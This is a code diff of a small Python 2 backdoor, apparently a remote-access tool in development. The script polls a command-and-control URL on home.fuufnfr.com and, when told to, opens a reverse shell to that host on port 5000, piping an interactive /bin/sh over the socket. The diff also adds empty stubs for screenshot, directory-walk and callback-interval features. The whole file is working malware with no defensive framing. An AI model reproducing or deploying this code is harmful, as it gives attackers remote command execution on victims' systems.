@@ -1,27 +1,45 @@
-import socket 
-import subprocess 
+import socket
+import subprocess
 import os
 import sys
 from urllib2 import urlopen
 
+
 def log(text):
-	print text
+    print text
+
+
+def screen_shot():
+    None
+
+
+def dir_walk():
+    None
+
+
+def set_cb_interval():
+    None
+
 
 def rev_shell():
-	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect(("home.fuufnfr.com",5000))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("home.fuufnfr.com", 5000))
 
-	os.dup2(s.fileno(),0) 
-	os.dup2(s.fileno(),1) 
-	os.dup2(s.fileno(),2)
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
 
-	p=subprocess.call(["/bin/sh","-i"])
+    p = subprocess.call(["/bin/sh", "-i"])
 
 def main():
-	command = urlopen('http://home.fuufnfr.com:5001/cnc?uid=1000')
-	com = command.read()	
+    command = urlopen('http://home.fuufnfr.com:5001/cnc?uid=1000')
+    com = command.read()
 
-	if com == "2":rev_shell(); 
+    if com == "1":
+        None
+    if com == "2":
+        rev_shell()
+
 
 if __name__ == "__main__":
-	main()
+    main()
